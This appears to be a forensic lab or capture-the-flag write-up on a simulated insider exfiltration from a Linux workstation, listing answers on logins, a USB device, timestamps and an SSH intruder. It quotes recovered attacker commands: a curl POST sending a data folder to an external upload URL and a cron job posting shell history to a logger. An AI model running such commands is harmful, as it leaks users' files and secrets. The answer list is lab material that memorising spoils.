Project Goal:
The goal of this investigation was to uncover evidence of data exfiltration from Liam's personal workstation, which was suspected to have been used to secretly transfer corporate data. To achieve this, a detailed analysis of the system, logs, connections, and hidden data was performed to find traces of the exfiltration and uncover connections with external participants in the incident.

Description and Steps Taken:
The initial task was to investigate Liam's personal machine, which was suspected to have been involved in data exfiltration. Given that it was his personal workstation running Linux, Liam might have taken additional measures to cover his tracks. However, I proceeded with a detailed examination to uncover evidence of his actions.

1. Finding the Last Login Time of Liam:

The first step I took was to find the date and time of Liam’s last login to the system. I searched the authentication logs using the grep command to filter events related to his sessions. I found that Liam last logged into the system on February 28, 2025, at 10:59:07. This coincided with the time the USB device was connected.

Answer: 2025-02-28 10:59:07

2. Identifying the Timezone of Liam’s Device:

Next, I wanted to determine the timezone of Liam's device. This information would help synchronize timestamps with other events. I checked the /etc/timezone file, which revealed that the system's timezone was set to America/Toronto.

Answer: America/Toronto

3. Analyzing the USB Connection:

One of the key steps in the investigation was identifying which USB device Liam connected to his system. I analyzed system logs that contained information about connected devices. I was able to extract the serial number of the device used for exfiltration.

Answer: 2651931097993496666

I then checked the logs for the exact time when the USB device was connected to the system.

Answer: 2025-02-28 10:59:25

4. Investigating the Commands for Transferring Files:

Liam used the transferfiles command to begin moving the data. I investigated the shell configuration files to see if transferfiles was an alias or function. I found that it was linked to the cp command, which copied files from the USB device to the home directory.

Answer: cp -r "/media/liam/46E8E28DE8E27A97/Critical Data TECH THM" /home/liam/Documents/Data

Next, I looked into how Liam transferred the exfiltrated files to an external server. By checking his command history, I found that he used the curl command to send data to the server with the IP address 5.45.102.93.

Answer: curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload

Answer for the server's IP address: 5.45.102.93

5. Additional Investigation:

I also discovered that Liam created a file named mth in his home directory. This led me to verify that he was in the /home/liam directory when the file was created.

Answer: /home/liam

Additionally, by analyzing the files and logs, I determined that Liam had an arrangement with an external entity named Henry, who was supposed to pay him for carrying out the data exfiltration task.

Answer: 10000

6. Important Event Timestamps:

I continued analyzing the logs and found that Liam disconnected the USB device at 11:44:00, which matched other timestamps.

Answer: 2025-02-28 11:44:00

7. Describing the Hidden Directory:

During the analysis, I found that Liam had used a hidden directory called .hidden, which contained several files. I identified that certain files in this directory, namely file3.txt and file7.txt, appeared to have their timestamps altered.

Answer for the directory path: /home/liam/Public

Answer for the timestamped files: file3.txt,file7.txt

8. External Entity Connecting via SSH:

During the investigation, I noticed that a few hours after the exfiltration, there was an SSH login from an external IP address 94.102.51.15. This confirmed that an external entity continued to interact with Liam's system after his actions.

Answer: 94.102.51.15

9. Analyzing Cron Jobs:

Finally, I found that the external entity had set up a cron job on Liam’s machine. This cron job executed every 30 minutes and sent the last few lines from the command history to an external server for monitoring purposes.

*Answer: /30 * * * * curl -s -X POST -d “$(whoami):$(tail -n 5 ~/.bash_history)” http://192.168.1.23/logger.php

Conclusion:
The analysis of Liam's system revealed that his personal workstation was indeed used for covert data exfiltration. Liam utilized a USB device to transfer files and the curl command to send the data to an external server. Notably, the investigation uncovered the involvement of an external entity, Henry, who had an agreement with Liam for the exfiltration task. The external entity also connected to Liam’s system through SSH and set up a cron job for continuous monitoring of the system.

This project highlights the importance of conducting thorough system, log, and data analysis to uncover hidden traces of actions and determine a user's involvement in security incidents.
